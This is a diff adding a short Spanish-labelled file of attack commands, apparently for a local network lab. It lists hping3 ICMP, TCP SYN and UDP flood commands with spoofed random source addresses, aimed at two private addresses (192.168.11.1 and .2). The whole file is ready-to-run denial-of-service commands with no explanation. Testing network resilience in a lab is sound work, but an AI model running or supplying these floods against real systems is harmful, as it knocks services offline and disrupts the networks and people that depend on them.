@@ -1,0 +1,12 @@
+#-------------------Ataques--------------------# 
+------------------- ICMP------------------------
+hping3 192.168.11.1 --flood --rand-source --icmp -c 25000
+hping3 192.168.11.2 --flood --rand-source --icmp -c 25000
+
+------------------- TCP ---------------------------------
+hping3 --flood -S -p 80 -c 15000 --rand-source 192.168.11.1
+hping3 --flood -S -p 80 -c 15000 --rand-source 192.168.11.2
+
+------------------- UDP ------------------------
+hping3 --flood --udp -p 80 -c 15000 --rand-source 192.168.11.1
+hping3 --flood --udp -p 80 -c 15000 --rand-source 192.168.11.2
